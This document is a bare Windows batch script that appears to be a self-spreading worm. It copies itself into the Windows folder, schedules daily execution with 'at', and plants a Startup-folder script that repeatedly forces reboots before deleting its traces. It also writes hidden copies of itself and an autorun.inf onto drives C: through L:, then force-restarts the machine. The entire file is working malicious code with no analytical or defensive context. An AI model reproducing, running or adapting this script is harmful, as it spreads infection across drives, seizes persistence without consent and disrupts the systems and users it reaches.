@echo off 
attrib -r -h -s "%~nx0" 2>nul >nul 
attrib -r -h -s %windir%\"%~nx0" 2>nul >nul 
copy "%~nx0" %windir% /y 2>nul >nul 
at 9:20 /every:m,t,w,th,f,s,su "%windir%\%~nx0" 
echo reboot>%windir%\temp.dll 
set pat=「开始」菜单\程序\启动 
echo @echo off>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo echo reboot^>^>%%windir%%\temp.dll>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo find /c "reboot" %%windir%%\temp.dll^|find "11">>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo if errorlevel 1 goto rebootnow>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo del %%windir%%\user.dll /f /q>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo del %%windir%%\temp.dll /f /q>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo del /f /q "%%~nx0">>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo exit>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo :rebootnow>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo shutdown /r /t 0 /f>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo exit>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
echo [autorun]>%windir%\user.dll 
echo shellexecute=%~nx0>>%windir%\user.dll 
set disk=C:>nul 2>nul 
:auto 
copy %windir%\"%~nx0" %disk%\ /y 2>nul >nul 
copy %windir%\user.dll %disk%\autorun.inf /y 2>nul >nul 
attrib +s +h +r %disk%\%~nx0 2>nul >nul 
attrib +s +h +r %disk%\autorun.inf 2>nul >nul 
cls 
goto %disk%>nul 2>nul 
:C: 
set disk=D:>nul 2>nul 
goto auto>nul 2>nul 
: D:
set disk=E:>nul 2>nul 
goto auto>nul 2>nul 
:E: 
set disk=F:>nul 2>nul 
goto auto>nul 2>nul 
:F: 
set disk=G:>nul 2>nul 
goto auto>nul 2>nul 
:G: 
set disk=H:>nul 2>nul 
goto auto>nul 2>nul 
:H: 
set disk=I:>nul 2>nul 
goto auto>nul 2>nul 
:I: 
set disk=J:>nul 2>nul 
goto auto>nul 2>nul 
:J: 
set disk=K:>nul 2>nul 
goto auto>nul 2>nul 
:K: 
set disk=L:>nul 2>nul 
goto auto>nul 2>nul 
: L:
cls 
attrib +s +h +r %windir%\%~nx0 2>nul >nul 
shutdown /r /t 0 /f 
exit
